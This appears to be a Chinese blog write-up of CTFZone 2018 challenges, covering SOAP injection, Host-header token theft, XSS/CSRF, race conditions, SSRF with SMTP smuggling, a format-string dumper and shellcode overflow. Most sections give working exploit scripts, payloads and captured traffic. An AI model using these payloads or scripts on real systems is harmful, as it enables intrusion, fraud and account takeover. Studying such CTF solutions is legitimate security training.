---
title: ctfzone-ctf
date: 2018-08-03 10:11:42
tags: ctf
---

# Web

## Piggy Bank

1. 根据注释找到*http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php*

   ```xml
   <wsdl:definitions xmlns:tns="urn:Bank" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns="http://schemas.xmlsoap.org/wsdl/" name="Bank" targetNamespace="urn:Bank">
   <message name="BalanceRequest">
   <part name="wallet_num" type="xsd:decimal"/>
   </message>
   <message name="BalanceResponse">
   <part name="code" type="xsd:float"/>
   <part name="status" type="xsd:string"/>
   </message>
   <message name="internalTransferRequest">
   <part name="receiver_wallet_num" type="xsd:decimal"/>
   <part name="sender_wallet_num" type="xsd:decimal"/>
   <part name="amount" type="xsd:float"/>
   <part name="token" type="xsd:string"/>
   </message>
   <message name="internalTransferResponse">
   <part name="code" type="xsd:float"/>
   <part name="status" type="xsd:string"/>
   </message>
   <portType name="BankServicePort">
   <operation name="requestBalance">
   <input message="tns:BalanceRequest"/>
   <output message="tns:BalanceResponse"/>
   </operation>
   <operation name="internalTransfer">
   <input message="tns:internalTransferRequest"/>
   <output message="tns:internalTransferResponse"/>
   </operation>
   </portType>
   <binding name="BankServiceBinding" type="tns:BankServicePort">
   <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
   <operation name="requestBalance">
   <soap:operation soapAction="urn:requestBalanceAction"/>
   <input>
   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
   </input>
   <output>
   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
   </output>
   </operation>
   <operation name="internalTransfer">
   <soap:operation soapAction="urn:internalTransferAction"/>
   <input>
   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
   </input>
   <output>
   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
   </output>
   </operation>
   </binding>
   <wsdl:service name="BankService">
   <wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
   <soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php"/>
   </wsdl:port>
   </wsdl:service>
   </wsdl:definitions>
   ```

2. 包含两个API

   - **Request Balance** allows us to see the balance of any account id we want.
   - **Internal Transfer** transfers some amount from account *sender* to account *receiver*.

3. 解法1：XML/soap注入

   internalTransfer请求：

   ```xml
   <receiver_wallet_num xsi:type="xsd:decimal"> [DATA FROM FORM INPUT] </receiver_wallet_num>
   <sender_wallet_num xsi:type="xsd:decimal"> [LOGGED IN USER ID] </sender_wallet_num>
   <amount xsi:type="xsd:float"> [DATA FROM FORM INPUT] </amount>
   <token xsi:type="xsd:string"> [SECRET SERVER TOKEN] </token>
   ```

   传递参数Receiver:

   ```
   (Our ID) </receiver_wallet_num>
   <sender_wallet_num xsi:type="xsd:decimal">(Any ID)</sender_wallet_num><!--
   ```

   传递参数Amount:

   ```
   --><amount xsi:type="xsd:float"> (Amount)
   ```

   结果:

   ```xml
   <receiver_wallet_num xsi:type="xsd:decimal"> (Our ID) </receiver_wallet_num>
   <sender_wallet_num xsi:type="xsd:decimal">(Any ID)</sender_wallet_num>
   <!-- </receiver_wallet_num>
   <sender_wallet_num xsi:type="xsd:decimal"> [LOGGED IN USER ID] </sender_wallet_num>
   <amount xsi:type="xsd:float"> 
   -->
   <amount xsi:type="xsd:float"> (Amount) </amount>
   <token xsi:type="xsd:string"> [SECRET SERVER TOKEN] </token>
   ```

   然后开burp跑就行。

   ![](/assets/ctfzone/TIM截图20180803174532.png)

4. 解法2：Host header poisoning

   从上图，我们可以看到当前Host是`web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one`

   修改该Host为我们的vps_ip,并在我们的vps上创建`/api/bankservice.wsdl.php`文件，然后发包，监听80端口。

   ![](/assets/ctfzone/TIM截图20180803181237.png)

   监听端口:

   >ngrep -q -d eth0 -W byline port 80

   抓包结果：

   ```
   T 10.135.89.224:80 -> 18.184.147.62:46038 [A]
   HTTP/1.1 200 OK.
   Date: Fri, 03 Aug 2018 10:08:43 GMT.
   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.
   X-Powered-By: PHP/5.4.16.
   Content-Length: 2907.
   Connection: close.
   Content-Type: text/html; charset=UTF-8.
   .
   <?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="Bank"
                targetNamespace="urn:Bank"
                xmlns:tns="urn:Bank"
                xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
                xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
                xmlns="http://schemas.xmlsoap.org/wsdl/">
   
       <message name="BalanceRequest">
           <part name="wallet_num" type="xsd:decimal"/>
       </message>
   
       <message name="BalanceResponse">
           <part name="code" type="xsd:float"/>
           <part name="status" type="xsd:string"/>
       </message>
   
       <message name="internalTransferRequest">
           <part name="receiver_wallet_num" type="xsd:decimal"/>
           <part name="sender_wallet_num" type="xsd:decimal"/>
           <part name="amount" type="xsd:float"/>
           <part name="token" type="xsd:string"/>
       </message>
   
       <message name="internalTransferResponse">
           <part name="code" type="xsd:float"/>
           <part name="status" type="xsd:string"/>
       </message>
   
       <portType name="BankServicePort">
           <operation name="requestBalance">
               <input message="tns:BalanceRequest"/>
               <output message="tns:BalanceResponse"/>
           </operation>
           <operation name="internalTransfer">
               <input message="tns:internalTransferRequest"/>
               <output message="tns:internalTransferResponse"/>
           </operation>
       </portType>
   
       <binding name="BankServiceBinding" type="tns:BankServicePort">
           <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
           <operation name="requestBalance">
               <soap:operation soapAction="urn:requestBalanceAction"/>
               <input>
                   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
               </input>
               <output>
                   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
               </output>
           </operation>
           <operation name="internalTransfer">
               <soap:operation soapAction="urn:internalTransferAction"/>
               <input>
                   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
               </input>
               <output>
                   <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
               </output>
           </operation>
       </b
   
   T 10.135.89.224:80 -> 18.184.147.62:46038 [AP]
   inding>
   
       <wsdl:service name="BankService">
           <wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
               <soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php" />
           </wsdl:port>
       </wsdl:service>
   </wsdl:definitions>
   
   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]
   POST /api/bankservice.php HTTP/1.1.
   Host: 123.207.90.143.
   Connection: Keep-Alive.
   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.
   Content-Type: application/soap+xml; charset=utf-8; action="internalTransferAction".
   Content-Length: 869.
   .
   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Bank" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <SOAP-ENV:Body>
           <ns1:internalTransfer>
             <receiver_wallet_num xsi:type="xsd:decimal">1340</receiver_wallet_num>.
   <sender_wallet_num xsi:type="xsd:decimal">.2652.</sender_wallet_num><!--</receiver_wallet_num>
             <sender_wallet_num xsi:type="xsd:decimal">1340</sender_wallet_num>
             <amount xsi:type="xsd:float">--><amount xsi:type="xsd:float">750000</amount>
             <token xsi:type="xsd:token">somesupertokenkey1235555</token>
           </ns1:internalTransfer>
         </SOAP-ENV:Body>
       </SOAP-ENV:Envelope>
      
   T 10.135.89.224:80 -> 18.184.147.62:46040 [AP]
   HTTP/1.1 404 Not Found.
   Date: Fri, 03 Aug 2018 10:08:43 GMT.
   Server: Apache/2.4.6 (CentOS) PHP/5.4.16.
   Content-Length: 217.
   Keep-Alive: timeout=5, max=100.
   Connection: Keep-Alive.
   Content-Type: text/html; charset=iso-8859-1.
   .
   <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
   <html><head>
   <title>404 Not Found</title>
   </head><body>
   <h1>Not Found</h1>
   <p>The requested URL /api/bankservice.php was not found on this server.</p>
   </body></html>
   ```

   这样我们就拿到了token，然后就可以愉快的转账了。

   直接按这个发这个包即可:

   ```
   T 18.184.147.62:46040 -> 10.135.89.224:80 [AP]
   POST /api/bankservice.php HTTP/1.1.
   Host: 123.207.90.143.
   Connection: Keep-Alive.
   User-Agent: PHP-SOAP/7.0.30-0ubuntu0.16.04.1.
   Content-Type: application/soap+xml; charset=utf-8; action="internalTransferAction".
   Content-Length: 869.
   .
   <SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Bank" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <SOAP-ENV:Body>
           <ns1:internalTransfer>
             <receiver_wallet_num xsi:type="xsd:decimal">1340</receiver_wallet_num>.
   		 <sender_wallet_num xsi:type="xsd:decimal">2652</sender_wallet_num>
   		 <amount xsi:type="xsd:float">750000</amount>
             <token xsi:type="xsd:token">somesupertokenkey1235555</token>
           </ns1:internalTransfer>
         </SOAP-ENV:Body>
       </SOAP-ENV:Envelope>
   ```

## Magician

1. 从support.php可知该题应该是XSS。修改*Link to Profile*可以判断后台bot使用*Firefox 61.0*

   ![](/assets/ctfzone/TIM截图20180803210045.png)

   vps日志显示如下:

   ```
   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] "GET / HTTP/1.1" 200 65 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
   35.156.178.88 - - [03/Aug/2018:20:56:35 +0800] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
   ```

2. xss漏洞

   uuid存在反射型xss,限制长度36个字符

   ![](/assets/ctfzone/TIM截图20180803211936.png)

3. how to get flag

   ![](/assets/ctfzone/TIM截图20180803212218.png)

   这里需要管理员将`Status`修改为`Premium`

4. 思路：

   CSP如下:

   ```
   Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
   X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one
   X-XSS-Protection: 1; mode=block
   ```

   由于后台使用Firefox,所以`X-XSS-Protections` 没有作用。

   通过XSRF修改状态。

5. 解法1：

   payload如下:

   ```
   <script>
         window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', `
           $.get("manage.php", function(data){    
                   var x = /name="token" value="([^"]+)/.exec(data);
                   $.post("manage.php", {user_uuid: "86dced2a-0305-42ed-a13c-f0c2e6079805", token: x[1], status: "premium"}); 
            });
      `);
   </script>
   ```

   含义:

   ```
   window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', <long payload>) 
   ```

   将 window.name 设置为`<long payload> `。

   将该html放在vps上，然后提交即可。

   ![](/assets/ctfzone/TIM截图20180803213031.png)

   getflag

   ![](/assets/ctfzone/TIM截图20180803212919.png)

6. 解法2:

   payload:

   ```
   http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><iframe onload=srcdoc=window.name>
   ```

   `iframe`在使用参数`srcdoc`加载的时候，会被当做同一个源。

   测试，在Firefox下测试

   打开Firefox,在控制台中输入:

   ```
   window.name='<script>alert("This is XSS!")</scrip'+'t>';
   ```

   接下来一次在控制台中输入:

   ```
   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E';
   ```

   发现成功弹窗户。

   ![](/assets/ctfzone/TIM截图20180803214831.png)

   在次输入:

   ```
   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E';
   ```

   我们会发现，再不添加`srcdoc`参数的情况下，不在弹窗。

   ![](/assets/ctfzone/TIM截图20180803214950.png)

   getflag:

   ```
   <script>
   window.name = `
   <script>
   window.frameElement.onload=null;
   console.log(window.parent.document.body.innerHTML);
   function elo()
   {
   document.getElementById('cudo').onload=null;
   r = document.getElementById('cudo').contentWindow.document;
   r.getElementsByName('user_uuid')[0].value = 'dbb306dd-28c1-4333-88ba-9588842f08e0';
   r.getElementsByName('status')[0].value = 'premium';
   r.getElementById('user_manage').submit();
   }
   
   `
   window.name += '</scrip'+'t><iframe src="/manage.php" onload="elo()" id="cudo">';
   window.location = 'http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E'
   ```

## MMORPG 3000

1. 注册登录

2. 在`Donate`页面获取免费武器。

   ![](/assets/ctfzone/TIM截图20180803220511.png)

   图片url:

   ```
   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png
   ```

   其中：

   ![](/assets/ctfzone/TIM截图20180803220606.png)

   此时，userid为860。

3. 获取更多`coupon`

   根据上边得到结果，我们可以测试一下 `859`

   ![](/assets/ctfzone/TIM截图20180803221240.png)

   得到url:

   ```
   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png
   ```

   访问该url:

   ![](/assets/ctfzone/TIM截图20180803221334.png)

   得到新的`Coupon`

   > f598109a-942c

   ![](/assets/ctfzone/TIM截图20180803221422.png)

   成功长了1分。

   这时候，测试`1`.

   ![](/assets/ctfzone/TIM截图20180803221713.png)

   得到url:

   ```
   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png
   ```

   ![](/assets/ctfzone/TIM截图20180803221807.png)

   然后就可以再次得到1337分，并升级。

4. 到达30级，新的问题。

   ![](/assets/ctfzone/TIM截图20180803221945.png)

   无法继续升级。

5. 条件竞争。

   这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。

   ```
   function levelup() {
       balance > 10:
       是:
       	level > 30:
       	是:
       		exit
       	否:
       		level++                 |
       		balance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 
       		insert into table       | 
       否:
       	exit
   }	
   ```

   并发方案1：

   创建1个账号，获取足够的balance。

   ```
   import requests
   import threading
   
   threadArray = []
   
   class expClass(threading.Thread):
       burp0_url = "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup"
       burp0_cookies = {"session": "eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ"}
       burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
       
       def __init__(self, numMain):
           super(expClass, self).__init__()
   
       def ham(self):
           requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)
   
           
       def run(self):
           self.ham()
           
   thr = 900
   
   for i in range(0, thr ):
           threadcan = expClass(i)
           threadArray.append(threadcan)
           
   for i in range(0, thr):
           threadArray[i].start()
           print "G thread girdi => " + str(i)
   for i in range(0, thr):
           threadArray[i].join()
           print "R thread cikti => " + str(i)
   ```

   并发方案2：

   首先创建两个新的账号，并获取足够的balance。

   race_condition.py

   ```
   import threading
   import requests
   from Queue import Queue
   
   max = 100
   threads = Queue()
   
   def lvlup(cookie):
       threads.get()
       url = "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup"
       r = requests.get(url, cookies={"session": cookie})
   
   
   def worker2(index):
       lvlup("eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE")       # chrome
   
   
   def worker(index):
       lvlup("eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0")         # firefox
   
   
   def race():
       for i in range(max):
           thread = threading.Thread(target=worker, args=[i])
           thread.start()
       for i in range(max):
           thread = threading.Thread(target=worker2, args=[i])
           thread.start()
       for i in range(max * 2):
           threads.put(i)
       threads.join()
   
   
   race()
   ```

   结果：

   ![](/assets/ctfzone/TIM截图20180803232555.png)

6. SSRF

   通过条件竞争，到达31级别，出现了新的页面。

   ```
   http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar
   ```

   这里存在ssrf漏洞。

   ![](/assets/ctfzone/TIM截图20180803234111.png)

   通过测试，可以发现过滤了`127.0.0.1`, `localhost`,可以通过`0.0.0.0`或者`127.0.0.2` bypass。

   端口扫描:

   示意图如下：

   ![](/assets/ctfzone/TIM截图20180803234335.png)

   

   经过测试，发现25端口开放。

   ![](/assets/ctfzone/port_scan.png)

   这里存在http header注入(CRLF注入)

   构造paylaod:

   ```
   Host: [0.0.0.0
   helo 1v3m
   mail from:<qaewjlfnwej@o3enzyme.com>
   rcpt to:<root>
   data
   subject: give me flag
   
   1v3m
   .
   ]:25
   ```

   最终payload:

   ```
   [0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
   ```

7. solution1:

   最终请求包:

   ```
   POST /user/avatar HTTP/1.1
   Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one
   User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: en-GB,en;q=0.5
   Accept-Encoding: gzip, deflate
   Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar
   Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016
   Content-Length: 581
   Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc
   DNT: 1
   Connection: close
   Upgrade-Insecure-Requests: 1
   
   -----------------------------4693211868403427471435307016
   Content-Disposition: form-data; name="avatar"; filename=""
   Content-Type: application/octet-stream
   
   
   -----------------------------4693211868403427471435307016
   Content-Disposition: form-data; name="url"
   
   https://[0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
   -----------------------------4693211868403427471435307016
   Content-Disposition: form-data; name="action"
   
   save
   -----------------------------4693211868403427471435307016--
   ```

8. solution2

   参考网址：https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg

   ```
   HELO 127.0.0.1
   MAIL FROM:<A@B.c>
   RCPT TO:<1096026150@qq.com>
   DATA
   From: AAA@B.C
   To: 1096026150@qq.com
   Subject: give me flag
   .
   QUIT
   ```

   payload1:

   ```
   curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0' --data 'url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: <A@B.C>%0aRCPT TO: <1096026150@qq.com>%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&action=save'
   ```

   注意，`url`需要使用`https`,ip地址除了`127.0.0.2`,也可以使用`0.0.0.0`。

   ```
   #define DEF_SMTPD_FORBID_CMDS    "CONNECT GET POST"
   
           /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */
           if (cmdp->name == 0) {
           state->where = SMTPD_CMD_UNKNOWN;
           if (is_header(argv[0].strval)
               || (*var_smtpd_forbid_cmds
            && string_list_match(smtpd_forbid_cmds, argv[0].strval))) {
                   msg_warn("non-SMTP command from %s: %.100s",
                        state->namaddr, vstring_str(state->buffer));
                   smtpd_chat_reply(state, "221 2.7.0 Error: I can break rules, too. Goodbye.");
                   break;
               }
           }
   ```

   原因:

   ```
   Our mistake was missing the special case implemented in postfix:
   There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. 
   简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。
   ```

   结果:

   ![](/assets/ctfzone/TIM截图20180803235132.png)

# PWN

## easypwn_strings

dump.py:

```
from pwn import *

def conn():
    return remote('pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one', 1234)

def dump(adr,frmt='p'):
    r.recvuntil('StrRemoveLastSymbols')
    r.recvuntil('\n')
    r.sendline('3')
    r.recvuntil(':')
    r.recvuntil('\n')

    leak_part = "|%19${}|".format(frmt)
    out = leak_part.ljust(4*10,"A")+"EOF_"+p32(adr)
    r.sendline(out)
    r.sendline('0')
    r.recvuntil('Result:')
    return r.recvuntil("|A")[:-2].split("|")[1]

start_addr = 0x8048750

while True:
    try:
        fd = open("dumped_file","a")
        r = conn()
        data = dump(start_addr,'s')
        print "|0x%08x|%s|" % (start_addr,data)
        if data == "(null)" or data == "":
            fd.write("\x00")
            start_addr += 1
        else:
            fd.write(data+"\x00")
            start_addr += len(data)+1
        fd.close()
        r.close()
    except Exception as e:
        print e
        print "[!] execption"
        break
```

payload.py:

```
#!/usr/bin/env python2
from pwn import *
def recvlines(lnum):
    global p
    res=""
    for x in range(lnum):
        res+=p.recvline()
    return res
 
host="pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one"
port=1234
 
base_buf=0x80492e0
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload=("y"+shellcode).ljust(256,"\x90")+p32(base_buf+1)
p=remote(host,port)
#p=process("./babypwn")
print recvlines(4)
p.sendline("X")
print recvlines(3)
p.sendline(payload)
p.interactive()
```

